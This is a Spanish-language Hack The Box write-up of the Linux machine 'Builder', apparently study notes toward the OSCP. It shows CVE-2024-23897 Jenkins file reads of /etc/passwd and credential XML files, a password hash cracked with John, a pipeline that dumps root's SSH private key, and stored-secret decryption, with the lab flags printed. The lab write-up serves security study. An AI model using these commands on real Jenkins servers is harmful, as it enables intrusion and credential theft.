---
tags:
  - type/writeup
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/591
dificultad: Media
ip: 10.10.11.10
os: Linux
relacionados:
  - "[[Jenkins Exploitation]]"
  - "[[CVE-2024-23897]]"
  - "[[Remote Code Execution|RCE]]"
  - "[[Cracking Hashes]]"
  - "[[docker]]"
  - "[[pipelines]]"
  - "[[03 - Conceptos/SSH|SSH]]"
---
# HackTheBox - Builder

## Reconocimiento

### Escaneo Inicial con Nmap

Mi primer paso fue realizar un escaneo de puertos en la máquina objetivo para identificar los servicios expuestos. Utilicé `nmap` para obtener una visión general rápida y completa.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG logs/allports
nmap -sCV -p22,80,389,443,5667 $(cat ip) -oN logs/builder-sCV
```

Los resultados del escaneo fueron los siguientes:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
```

El escaneo reveló dos puertos abiertos: el puerto **22 (SSH)** y el puerto **8080 (HTTP)**. El servicio en el puerto 8080 fue identificado como una instancia de **Jenkins**. Dado que no poseía credenciales para SSH, mi atención se centró por completo en la aplicación web de Jenkins.

---

## Análisis de vulnerabilidades

### Identificación de CVE-2024-23897

Al navegar a `http://10.129.230.220:8080`, me encontré con la página de inicio de sesión de Jenkins. En la parte inferior de la página, pude identificar la versión del software: **Jenkins 2.441**.

Con la versión en mano, realicé una búsqueda de vulnerabilidades conocidas. Rápidamente encontré información sobre **CVE-2024-23897**, una vulnerabilidad crítica de lectura arbitraria de archivos que afecta a esta versión de Jenkins y que no requiere autenticación.

La explotación de esta vulnerabilidad se realiza a través de la interfaz de línea de comandos (CLI) de Jenkins. Varios PoCs (Proof of Concepts) estaban disponibles, y la mayoría utilizaba el archivo `jenkins-cli.jar`, el cual, según la documentación, se puede descargar directamente desde la propia instancia de Jenkins.

---

## Explotación de vulnerabilidades

### Lectura Arbitraria de Archivos (CVE-2024-23897)

Para comenzar la explotación, primero descargué el cliente CLI de Jenkins desde el servidor objetivo:
```Bash
wget 10.129.230.220:8080/jnlpJars/jenkins-cli.jar
```

Una vez con el archivo, procedí a confirmar la vulnerabilidad intentando leer el archivo `/etc/passwd`. La sintaxis del exploit utiliza el argumento del comando `help` para pasar la ruta del archivo que deseo leer, precedida por un `@`.
```Bash
java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080/' connect-node @/etc/passwd
```
El resultado, aunque truncado, confirmó la vulnerabilidad al mostrarme fragmentos del archivo `/etc/passwd`:
```
ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.
COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)
```

>[!TIP] Mejora visual 
>Para mejorar la salida y que no se repita, le agregue un grep al comando anterior y una redirección:
>```bash
>java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080/' connect-node @/etc/passwd 2>&1 | grep -oP '".*?"'
>```

>[!WARNING] Comando help y otros
>El comando `help` no era ideal para leer archivos XML completos, ya que se detenía después de los primeros argumentos. Por suerte, el comando `connect-node` sí devolvía el contenido completo del archivo en los mensajes de error.

### Enumeración y Obtención de Credenciales

#### Reconocimiento y primera flag

Con la capacidad de leer archivos, mi siguiente objetivo era enumerar el entorno para encontrar información útil. Apunté al archivo `/proc/self/environ` para leer las variables de entorno del proceso de Jenkins.
```Bash
java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080/' connect-node @/proc/self/environ
```

La salida reveló dos datos clave:
1. La variable `HOME` estaba configurada en `/var/jenkins_home`.
2. La variable `HOSTNAME` tenía un valor alfanumérico aleatorio (`0f52c222a4cc`), lo cual es un fuerte indicio de que Jenkins se está ejecutando dentro de un **contenedor Docker**.
    
Sabiendo la ubicación del directorio `HOME`, aproveché para capturar la bandera del usuario:
```Bash
java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080/' connect-node @/var/jenkins_home/user.txt 2>&1 | grep -oP '".*?"'
```

#### Instalación y ejecución de jenkins con Docker

Para encontrar credenciales, necesitaba entender la estructura de directorios de Jenkins. Decidí replicar el entorno localmente levantando un contenedor Docker con la misma imagen.
```Bash
docker pull jenkins/jenkins:lts-jdk17
docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17
```

Luego de ejecutar el ultimo comando entro a la web para continuar con la instalación y pongo la contraseña que me dio la terminal: 
```http
http://localhost:8080/
# pass: 0dc9d753d4ee42df8288e600cf6801c4
```
A continuación me pregunta que plugins instalar, pongo los básicos, y sigo avanzando hasta terminar la instalación.

Después de una instalación básica en mi contenedor local, obtuve una shell dentro de él para explorar su sistema de archivos.
```Bash
docker exec -it <container_id> bash
cd /var/jenkins_home/
```

#### Obtención de información clave para avanzar en la explotación

Dentro del directorio `users`, encontré un archivo `users.xml` y un directorio con el nombre de mi usuario local (`admin_1331226977042020838`). El archivo `users.xml` mapeaba el nombre de usuario al nombre del directorio. Dentro de ese directorio, el archivo `config.xml` contenía el hash de la contraseña.

> [!INFO]
> 
> El comando connect-node funcionó porque el atributo denyAnonymousReadAccess estaba configurado en false en la máquina objetivo, permitiendo el acceso de lectura a usuarios anónimos.

Primero, leí `users.xml` para encontrar el nombre de usuario y su directorio asociado.
```Bash
java -jar jenkins-cli.jar -s 'http://10.129.230.220:8080' connect-node "@/var/jenkins_home/users/users.xml"
```

La salida me reveló el nombre de usuario **`jennifer`** y su directorio: `jennifer_12108429903186576833`. A continuación, usé esta información para leer su `config.xml` y obtener el hash de su contraseña.
```Bash
java -jar jenkins-cli.jar -s 'http://10.129.230.220:8080' connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"
```

El hash obtenido fue `#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a`. Lo guardé en un archivo y usé **John the Ripper** para crackearlo.
```Bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

La contraseña resultó ser `princess`. Con las credenciales `jennifer:princess`, pude iniciar sesión en la interfaz web de Jenkins.

---

## Escalada de privilegios

Una vez dentro del panel de Jenkins, exploré la sección de "Credentials". Allí encontré una credencial almacenada llamada `root`.

### Método 1: Pipeline con SSH Agent

La credencial era una clave privada SSH. Además, verifiqué que el plugin **SSH Agent** estaba instalado. Esto me dio una idea clara: podía crear un _pipeline_ que utilizara esta credencial para ejecutar comandos en la máquina anfitriona a través de SSH.

Creé un nuevo proyecto de tipo "Pipeline" y pegué el siguiente script:
```Groovy
pipeline {
    agent any
    stages {
        stage('SSH') {
            steps {
                script {
                    // El '1' corresponde al ID de la credencial 'root'
                    sshagent(credentials: ['1']) {
                        sh 'ssh -o StrictHostKeyChecking=no root@10.129.230.220 "cat /root/.ssh/id_rsa"'
                    }
                }
            }
        }
    }
}
```

Este script usa el plugin SSH Agent para cargar la clave `root` y ejecutar un comando SSH en el host (`10.129.230.220`). El comando que ejecuté fue `cat /root/.ssh/id_rsa` para exfiltrar la clave privada SSH del usuario `root` del propio host.

Lancé el _build_ y, en la "Console Output", obtuve la clave privada. La guardé en un archivo local, le di los permisos correctos y me conecté como `root`.
```Bash
chmod 600 root_key
ssh -i root_key root@10.129.230.220
root@builder:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Con esto, obtuve acceso total a la máquina.

### Método 2: Desencriptación de Credenciales

Como alternativa, descubrí que también podía desencriptar la credencial directamente desde Jenkins.

1. Navegué hasta la credencial `root` y hice clic en "Update".
2. Usando las herramientas de desarrollador del navegador, inspeccioné el campo del formulario que ocultaba la clave. Pude copiar el valor cifrado directamente del código HTML.
3. Fui a la consola de scripts de Jenkins, accesible en `http://10.129.230.220:8080/script`.
4. Ejecuté el siguiente script de Groovy, pegando la clave cifrada que había copiado:
```Groovy
println( hudson.util.Secret.decrypt("{AQAAABAAAAowLrf...aKSM=}"))
```

La consola me devolvió la clave SSH privada en texto plano. A partir de aquí, los pasos para obtener acceso root son idénticos a los del primer método.


___

## Bandera(s)

> [!FLAG] `flag{user}`
> 441f9fc899d9ddd035200eb1ba28ff65
^bandera

> [!FLAG] `flag{root}`
> 0e18542cbb18ade1b5b4115900a0847e
^bandera